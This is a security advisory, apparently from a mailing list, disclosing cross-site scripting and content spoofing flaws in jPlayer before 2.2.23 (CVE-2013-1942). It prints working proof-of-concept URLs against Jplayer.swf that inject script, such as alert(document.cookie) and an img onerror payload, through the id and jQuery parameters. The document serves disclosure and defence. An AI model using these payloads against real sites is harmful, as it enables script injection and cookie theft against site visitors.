    "text": "vul_name : jPlayer 2.2.22 XSS / Content Spoofing ， vul_cve : CVE-2013-1942 ， vul_poc : Hello list !  ， I want to inform you about multiple vulnerabilities in jPlayer. These are ， Cross-Site Scripting and Content Spoofing and vulnerabilities in jPlayer. ， Which is used at tens thousands of web sites and in multiple web ， applications. ， Affected products :  ， Vulnerable are versions before jPlayer 2.2.23. Version 2.2.23 and the last ， released version 2.3.0 are not vulnerable to mentioned XSS , except CS via JS ， and XSS via JS callbacks. Also there are other bypass methods which work in ， version 2.3.0 , but the developers haven't fixed them besides attack via ， alert. About that I've wrote to developers already in March and reminded ， again. So wait for new version with fixing of these vulnerabilities. ， Affected vendors :  ， Happyworm ， Details :  ， Cross-Site Scripting ( WASC-08 )  :  ， In different versions of jPlayer there are different XSS vulnerabilities. ， 0.2.1 - 1.2.0 :  ， http : /site/Jplayer.swf?id=%22 ) }catch ( e ) {}if (  ! self.a ) self.a= ! alert ( document.cookie ) / ， 2.0.0 :  ， http : /site/Jplayer.swf?id=%27 ) }catch ( e ) {}if (  ! self.a ) self.a= ! alert ( document.cookie ) / ， 2.1.0 :  ， http : /site/Jplayer.swf?jQuery= ) }catch ( e ) {}if (  ! self.a ) self.a= ! alert ( document.cookie ) / ， http : /site/Jplayer.swf?id=%27 ) }catch ( e ) {}if (  ! self.a ) self.a= ! alert ( document.cookie ) / ， In version 2.2.0 these XSS vulnerabilities were fixed ( the developers was ， informed about hole in jQuery parameter and made a fix , which protected from ， both attacks ) . But Malte Batram ( in version 2.2.19 ) and I ( in version ， 2.2.20 ) have found new ones. ， 2.2.0 - 2.2.19 ( and previous versions )  :  ， Attack works in Firefox ( all versions and browsers on Gecko engine )  , IE6 and ， Opera 10.62. ， http : /site/Jplayer.swf?jQuery=document.write&id=%3Cimg%20src=1%20onerror=alertu0028document.cookieu0029%3E ， 2.2.20 - 2.2.22 ( and previous versions )  :  ， http : /site/Jplayer.swf?jQuery=alert&id=XSS ， Content Spoofing ( WASC-12 )  :  ， It's possible to conduct CS ( inclusion of audio/video files from external ， resources ) via JS and XSS via JS callbacks. This requires HTML Injection ， vulnerability at the site. The attack is similar to XSS attacks via ， callbacks in JW Player (  ， Because this attack vector requires separate vulnerability at target site to ， conduct CS and XSS attacks with using of jPlayer , the developers didn't do ， anything to fix it. The same as developers JW Player. So protection from ， this attack scenario lies solely on web sites owners.",
